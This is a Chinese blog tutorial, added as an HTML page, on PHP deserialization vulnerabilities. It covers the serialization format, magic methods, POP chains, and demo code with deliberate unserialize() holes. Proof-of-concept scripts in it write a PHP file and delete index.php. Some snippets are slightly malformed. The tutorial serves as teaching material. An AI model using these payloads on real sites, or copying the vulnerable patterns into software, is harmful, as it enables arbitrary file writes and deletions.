@@ -1,0 +1,330 @@
+<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>php反序列化漏洞总结 | Pale</title><meta name="keywords" content="漏洞总结,php"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="序列化和反序列化为了有效存储和传递数据同时不丢失类型和结构 需要利用序列化和反序列化函数对数据进行处理序列化函数返回字符串 字符串包含了表示值的字节流可以存储于任何地方反序列化函数对于单一的已序列化的变量进行操作 将其转换为原来的值二者结合可以轻松存储数据 使程序更具维护性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化漏洞总结">
+<meta property="og:url" content="http://example.com/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Pale">
+<meta property="og:description" content="序列化和反序列化为了有效存储和传递数据同时不丢失类型和结构 需要利用序列化和反序列化函数对数据进行处理序列化函数返回字符串 字符串包含了表示值的字节流可以存储于任何地方反序列化函数对于单一的已序列化的变量进行操作 将其转换为原来的值二者结合可以轻松存储数据 使程序更具维护性">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="http://example.com/imgg/7.jpeg">
+<meta property="article:published_time" content="2021-07-25T02:14:50.000Z">
+<meta property="article:modified_time" content="2021-11-28T06:21:52.192Z">
+<meta property="article:author" content="One">
+<meta property="article:tag" content="漏洞总结">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgg/7.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'php反序列化漏洞总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2021-11-28 14:21:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/imgg/7.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">php反序列化漏洞总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-07-25T02:14:50.000Z" title="Created 2021-07-25 10:14:50">2021-07-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-11-28T06:21:52.192Z" title="Updated 2021-11-28 14:21:52">2021-11-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="php反序列化漏洞总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>为了有效存储和传递数据同时不丢失类型和结构 需要利用序列化和反序列化函数对数据进行处理<br>序列化函数返回字符串 字符串包含了表示值的字节流可以存储于任何地方<br>反序列化函数对于单一的已序列化的变量进行操作 将其转换为原来的值<br>二者结合可以轻松存储数据 使程序更具维护性</p>
+<span id="more"></span>
+
+<h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h1 id="serialize函数"><a href="#serialize函数" class="headerlink" title="serialize函数"></a>serialize函数</h1><p>是序列化函数，序列化对象时 PHP在序列化动作之前调用成员函数__sleep 这样就允许对象在被序列化之前做任何清除操作。<br><strong>类型字母详解:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array  </span><br><span class="line">b - boolean  </span><br><span class="line">d - double  </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
+
+<p>boolean</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b:;</span><br><span class="line">b:1; // True</span><br><span class="line">b:0; // False</span><br></pre></td></tr></table></figure>
+
+<p>integer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i:;</span><br><span class="line">i:1; // 1</span><br><span class="line">i:-3; // -3</span><br></pre></td></tr></table></figure>
+
+<p>double</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d:;</span><br><span class="line">d:1.2345600000000001; // 1.23456（php弱类型所造成的四舍五入现象）</span><br></pre></td></tr></table></figure>
+
+<p>NULL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N; //NULL</span><br></pre></td></tr></table></figure>
+
+<p>string</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s::&quot;&quot;;</span><br><span class="line">s&quot;PALEONEC&quot;; // &quot;PALEONEC&quot;</span><br></pre></td></tr></table></figure>
+
+<p>array</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a::&#123;key, value pairs&#125;;</span><br><span class="line">a&#123;s&quot;key1&quot;;s&quot;value1&quot;;s&quot;value2&quot;;&#125; // array(&quot;key1&quot; =&gt; &quot;value1&quot;, &quot;key2&quot; =&gt; &quot;value2&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;</span><br><span class="line">类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注：对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。<br>所以在传入序列化字符串的时候，需要补齐这些空字节。如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;%00test%00flag&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Active&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>是反序列化函数，若被序列化的变量是一个对象，重新构造对象之后会自动调用__wakeup成员函数</p>
+<p>举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;test&#x27;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这串代码，我们可以看到变量<code>$a</code>从url中test参数获取到内容，并且在反序列化的时候通过<code>__destruct()</code>直接将传入的数据不经过任何处理，echo出来，这里就存在反射型xss漏洞了。</p>
+<p>在反序列化中,我们所能控制的数据就是对象中的各个属性值,所以在PHP的反序列化有一种漏洞利用方法叫做 “面向属性编程” ,即 POP( Property Oriented Programming)。和二进制漏洞中常用的ROP技术类似。在ROP中我们往往需要一段初始化gadgets来开始我们的整个利用过程,然后继续调用其他gadgets。在PHP反序列化漏洞利用技术POP中,对应的初始化gadgets就是<code>__wakeup()</code> 或者是<code>__destruct()</code> 方法, 在最理想的情况下能够实现漏洞利用的点就在这两个函数中,但往往我们需要从这个函数开始,逐步的跟进在这个函数中调用到的所有函数,直至找到可以利用的点为止。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.unserialize函数的参数可控<br>2.存在魔法函数<br>总结几个常用魔术方法及触发条件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-几个可用的POP链方法"><a href="#1-几个可用的POP链方法" class="headerlink" title="1.几个可用的POP链方法"></a>1.几个可用的POP链方法</h2><p>命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br></pre></td></tr></table></figure>
+
+<p>文件操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure>
+
+<p>如果在跟进程序过程中发现这些函数就要打起精神,一旦这些函数的参数我们能够控制,就有可能出现高危漏洞.</p>
+<h2 id="2-POP链demo示例"><a href="#2-POP链demo示例" class="headerlink" title="2.POP链demo示例"></a>2.POP链demo示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;demo\n&quot;;</span><br><span class="line">    private $filename = &#x27;./demo&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(file_get_contents(&#x27;./serialized.txt));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个很简单的示例代码，且这个代码存在反序列化漏洞。该文件还定义了一个 popdemo 类,并且该类实现了 <code>__wakeup</code> 函数,然后在该函数中又调用了save函数，且参数对象是文件名。跟进save函数，我们看到在该函数中通过调用<code>file_put_contents</code>函数，这个函数的<code>$filename</code>和<code>data</code>属性值是从save函数中传出来的，并且创建了一个文件。由于<code>__wakeup()</code>函数在序列化时自动调用，这里还定义了一个保存文件的函数，在这个反序列化过程中对象的属性值可控。于是这里就存在一个任意文件写入任意文件内容的反序列化漏洞了。这就是所谓的POP。就是关注整个函数的调用过程中参数的传递情况,找到可利用的点,这和一般的Web漏洞没什么区别,只是可控制的值有直接传递给程序的参数转变为了对象中的属性值。</p>
+<p>利用poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;&lt;?php phpinfo();?&gt;\n&quot;;</span><br><span class="line">    private $filename = &#x27;./poc.php&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$demo = new popdemo();</span><br><span class="line">echo serialize($demo);</span><br><span class="line">file_put_contents(&quot;./serialized.txt&quot;,serialize($demo));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里定义了<code>$data</code>和<code>$filename</code>，然后序列化字符串后存储到serialized.txt文件中，序列化字符串：</p>
+<p><img src="hao2m.png" alt="4"></p>
+<p>然后运行demo代码，会在同目录下生成一个poc.php</p>
+<p><img src="tzldu.png" alt="5"></p>
+<h1 id="反序列化漏洞的利用"><a href="#反序列化漏洞的利用" class="headerlink" title="反序列化漏洞的利用"></a>反序列化漏洞的利用</h1><h2 id="1-利用构造函数等"><a href="#1-利用构造函数等" class="headerlink" title="1.利用构造函数等"></a>1.利用构造函数等</h2><p>php在使用unserialize()后会导致<code>__wakeup()</code> 或<code>__destruct()</code>的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<code>__wakeup()</code> 或<code>__destruct()</code>中，从而当我们控制序列化字符串时可以去直接触发它们。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class pocdemo&#123;</span><br><span class="line">    function __construct($test)&#123;</span><br><span class="line">        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">        fwrite($fp,$test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;123&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = file_get_contents(&#x27;./ser.txt&#x27;);</span><br><span class="line">unserialize($test);</span><br><span class="line"></span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里代码主要是通过get方法通过test传入序列化好的字符串，然后在反序列化的时候自动调用<code>__wakeup()</code>函数，在<code>__wakeup()</code>函数中通过new pocdemo()会自动调用对象pocdemo中的<code>__construct()</code>，从而把<code>&lt;?php phpinfo(); ?&gt;</code>写入到shell.php中。</p>
+<p>poc代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ser = new l1nk3r();</span><br><span class="line">$result = serialize($ser);</span><br><span class="line">print $result;</span><br><span class="line">file_put_contents(&#x27;./ser.txt&#x27;,$result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="E:/机密文件/hexo/blog/source/_posts/php反序列化漏洞总结/pu7ob.png" alt="6">然后将这个序列化的字符重新导入到poc代码中，反序列化之后，就会生成一个shell.php,并且内容为<code>&lt;?php phpinfo(); ?&gt;</code></p>
+<p><img src="4g1pi.png" alt="7"></p>
+<p>存在漏洞的思路：一个类用于临时将日志储存进某个文件，当__destruct被调用时，日志文件将会被删除，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class logfile</span><br><span class="line">&#123;</span><br><span class="line">    //log文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //一些用于储存日志的代码</span><br><span class="line">    public function logdata($text)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;log data:&#x27;.$text.&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">        file_put_contents($this-&gt;filename,$text,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    //destrcuctor 删除日志文件</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;__destruct deletes &#x27;.$this-&gt;filename.&#x27;file.&lt;br /&gt;&#x27;;</span><br><span class="line">        unlink(dirname(__FILE__).&#x27;/&#x27;.$this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//test5.php</span><br></pre></td></tr></table></figure>
+
+
+<p>调用这个类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test5.php&#x27;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    //类数据</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //输出数据</span><br><span class="line">    public function printdata()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;User &#x27;.$this-&gt;name.&#x27; is&#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//重建数据</span><br><span class="line">$usr = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">//一个示例代码</span><br></pre></td></tr></table></figure>
+
+<p>GET[‘usr_serialized’]);$_GET[‘usr_serialized’]是可控的，那么我们就可以构造输入删除任意文件<br>构造输入删除目录下的index.php文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;test5.php&#x27;;</span><br><span class="line">$object = new logfile();</span><br><span class="line">$object-&gt;filename = &#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($object).&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">//test7.php</span><br></pre></td></tr></table></figure>
+
+
+<p>接下来先进入index.php：</p>
+<p>接下来尝试使用test7.php删除了index.php，进入test7.php:<br>现在在目录里已经没有了index.php:</p>
+<p>我们再次访问一下test7.php试一试：</p>
+<p>index.php已经没有了。<br>这是一个简单的示例。</p>
